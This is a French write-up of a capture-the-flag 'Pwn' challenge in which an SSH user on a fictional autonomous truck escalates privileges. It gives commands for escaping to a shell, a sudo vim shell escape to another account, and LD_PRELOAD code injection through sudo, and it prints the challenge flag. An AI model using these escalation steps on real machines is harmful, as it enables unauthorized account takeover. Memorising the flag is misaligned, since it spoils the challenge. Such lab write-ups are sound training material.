# Alone Muks

[Lien](https://ctf.challengecybersec.fr/7a144cdc500b28e80cf760d60aca2ed3/challenge-detail.php?chall=23)

Points : 100

Category : Pwn


## Description

Lors de votre récent séjour à Evil Country, vous êtes parvenu à brancher un dispositif sur le camion effectuant la livraison. Il faut maintenant trouver une faille sur le système pour pouvoir prendre le contrôle du camion autonome de la marque Lates et le rediriger vers un point d'extraction. Un agent a posé un dispositif nous permettant d'accéder au système de divertissement du véhicule. A partir de ce dernier, remontez jusqu'au système de navigation.
Connectez-vous en SSH au camion

Identifiants: user:user

Le serveur est réinitialisé périodiquement

Port : 5004

Le flag est de la forme DGSESIEE{hash}

## Accès

```bash
ssh -p 5004 user@challengecybersec.fr
```


## Solution

### étape 1

Sortir du script avec `Ctrl-C`

```bash
python -c import os; os.system("/bin/bash")
```

Taper `sudo -l` pour savoir à quoi on a droit.

### étape 2

```bash
/usr/bin/sudo -u globalSystem vim
```
puis `:!/bin/bash`


### étape 3

```bash
sudo -u navigationSystem /usr/bin/update AloneIsTheBest
```

Mais `/usr/bin/update` ne fait rien de spécial... son reverse permet juste de trouver un mot de passe inutile.

On va utiliser le LD_PRELOAD pour injecter du code dans le binaire, à son insu.

```bash
cc -shared -fPIC -o /tmp/toto.so preload.c
sudo LD_PRELOAD=/tmp/toto.so -u navigationSystem --preserve-env=LD_PRELOAD /usr/bin/update
```

Le flag est: `DGSESIEE{44adfb64ff382f6433eeb03ed829afe0}`